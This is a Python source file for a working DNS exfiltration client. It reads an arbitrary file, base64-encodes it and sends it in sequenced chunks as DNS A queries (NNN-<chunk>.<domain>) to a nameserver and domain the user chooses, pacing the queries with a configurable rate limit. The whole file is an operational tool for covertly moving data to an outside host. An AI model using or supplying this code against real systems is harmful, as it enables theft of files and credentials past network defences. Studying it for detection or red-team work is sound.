#!/usr/bin/env python3

import argparse
import base64
import os
import time
from typing import List

import dns.resolver

from config import ServerConfig, load_config
from logger import setup_logger


class DNSExfiltrationClient:
    """
    DNS exfiltration client.

    The client reads a file as bytes, base64-encodes it, and sends it in
    fixed-size chunks using DNS A queries with the following label format:

        NNN-<base64_chunk>.<domain>

    where:
    - NNN is a zero-padded chunk ID (000, 001, 002, ...)
    - <base64_chunk> is a slice of the base64-encoded file contents
    - <domain> is the user-supplied domain/zone handled by the exfiltration server
    """

    # Maximum length of a single DNS label per RFC is 63 characters.
    _DNS_LABEL_MAX_LEN = 63

    def __init__(self, config: ServerConfig, logger) -> None:
        self.config = config
        self.logger = logger

        # Single resolver instance reused for all queries.
        self.resolver = dns.resolver.Resolver()

        # We only control the left-most label (NNN-<chunk>); the domain is a
        # separate label, so the only hard limit here is 63 chars for the
        # whole leading label.
        #
        # Reserve 3 chars for the zero-padded ID and 1 for the hyphen.
        max_chunk_by_label = self._DNS_LABEL_MAX_LEN - 4

        # Respect configured max_chunk_size but never exceed DNS label limits.
        self.chunk_size = min(max_chunk_by_label, self.config.max_chunk_size)

        self.total_sent = 0

        # Simple per-chunk delay to respect rate_limit (requests/minute).
        self.rate_limit_delay = 60 / config.rate_limit

    def setup_resolver(self, nameservers: List[str], port: int) -> None:
        """Configure the DNS resolver with the specified nameservers and port."""
        try:
            resolved_nameservers = []
            for ns in nameservers:
                try:
                    resolved = dns.resolver.resolve(ns, 'A')
                    resolved_nameservers.extend([str(r) for r in resolved])
                except:
                    resolved_nameservers.append(ns)
            
            self.resolver.nameservers = resolved_nameservers
            self.resolver.port = port
            self.logger.info(f"Configured resolver with nameservers: {resolved_nameservers}, port: {port}")
        except Exception as e:
            self.logger.error(f"Failed to configure resolver: {e}")
            raise

        # Configure reasonable per-query timeouts on the shared resolver.
        self.resolver.timeout = 2.0
        self.resolver.lifetime = 2.0

    def chunk_data(self, raw_bytes: bytes) -> List[str]:
        """
        Base64-encode the raw bytes and split them into fixed-size chunks.

        The chunks are ASCII strings safe to embed in a DNS label, and their
        size is already capped by DNS label constraints.
        """
        encoded_data = base64.b64encode(raw_bytes).decode("ascii")
        return [
            encoded_data[i : i + self.chunk_size]
            for i in range(0, len(encoded_data), self.chunk_size)
        ]

    def validate_file(self, file_path: str) -> None:
        """Validate the input file."""
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
        
        file_size = os.path.getsize(file_path)
        if file_size > self.config.max_total_size:
            raise ValueError(
                f"File size ({file_size} bytes) exceeds maximum allowed size "
                f"({self.config.max_total_size} bytes)"
            )

    def send_chunk(self, chunk_id: int, chunk: str, domain: str) -> bool:
        """Send a single chunk of data via DNS query."""
        try:
            # Ensure the chunk ID doesn't make the label too long
            chunk_id_str = str(chunk_id).zfill(3)  # Pad with zeros to ensure consistent length
            query_name = f"{chunk_id_str}-{chunk}.{domain}"

            # Verify the label length (safety check; chunk_size should already enforce this).
            label_len = len(f"{chunk_id_str}-{chunk}")
            if label_len > self._DNS_LABEL_MAX_LEN:
                self.logger.error(
                    f"Chunk {chunk_id} label too long: {label_len} characters "
                    f"(max {self._DNS_LABEL_MAX_LEN})"
                )
                return False

            self.logger.debug(f"Sending chunk {chunk_id} to {query_name}")

            try:
                # We do not care about the content of the answer, only that the
                # query was successfully sent/processed (or NXDOMAIN/NoAnswer).
                self.resolver.resolve(query_name, "A")
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id}")
                time.sleep(self.rate_limit_delay)
                return True
            except dns.resolver.NXDOMAIN:
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id} (NXDOMAIN response)")
                time.sleep(self.rate_limit_delay)
                return True
            except dns.resolver.NoAnswer:
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id} (NoAnswer response)")
                time.sleep(self.rate_limit_delay)
                return True
            except Exception as e:
                self.logger.error(f"DNS query failed for chunk {chunk_id}: {e}")
                return False

        except Exception as e:
            self.logger.error(f"Failed to send chunk {chunk_id}: {e}")
            return False

    def exfiltrate_file(self, file_path: str, domain: str) -> bool:
        """
        Exfiltrate a file through DNS queries.

        Returns True if all chunks were sent successfully, False otherwise.
        """
        try:
            self.validate_file(file_path)

            # Read as bytes so arbitrary binary files are supported.
            with open(file_path, "rb") as file:
                file_bytes = file.read()

            chunks = self.chunk_data(file_bytes)

            self.logger.info(
                f"Starting exfiltration of {file_path} "
                f"({len(chunks)} chunks, {len(file_bytes)} bytes raw)"
            )

            success_count = 0
            for i, chunk in enumerate(chunks):
                if self.send_chunk(i, chunk, domain):
                    success_count += 1
                    self.logger.info(f"Progress: {success_count}/{len(chunks)} chunks sent")

            success_rate = (success_count / len(chunks)) * 100
            self.logger.info(
                f"Exfiltration complete. Success rate: {success_rate:.2f}% "
                f"({success_count}/{len(chunks)} chunks)"
            )

            return success_count == len(chunks)

        except Exception as e:
            self.logger.error(f"Exfiltration failed: {e}")
            return False


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration client.")
    parser.add_argument(
        "-f",
        "--file",
        required=True,
        help="Path to the file to exfiltrate.",
    )
    parser.add_argument(
        "--nameservers",
        default="127.0.0.1",
        help="Comma-separated list of nameservers. Default is '127.0.0.1'.",
    )
    parser.add_argument(
        "-d",
        "--domain",
        required=True,
        help="Domain to query data with. Example: example.com",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=53,
        help="Server listening port.",
    )
    parser.add_argument(
        "-c",
        "--config",
        help="Path to configuration file.",
    )
    return parser.parse_args()


def main():
    """Main function to run the DNS exfiltration client."""
    try:
        args = parse_args()
        
        # Setup logging
        logger = setup_logger()
        
        # Load configuration
        config = load_config(args.config)
        
        # Create client
        client = DNSExfiltrationClient(config, logger)
        
        # Setup resolver
        nameservers = [ns.strip() for ns in args.nameservers.split(',')]
        client.setup_resolver(nameservers, args.port)
        
        # Start exfiltration
        success = client.exfiltrate_file(args.file, args.domain)
        
        if not success:
            logger.error("Exfiltration failed")
            exit(1)
            
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
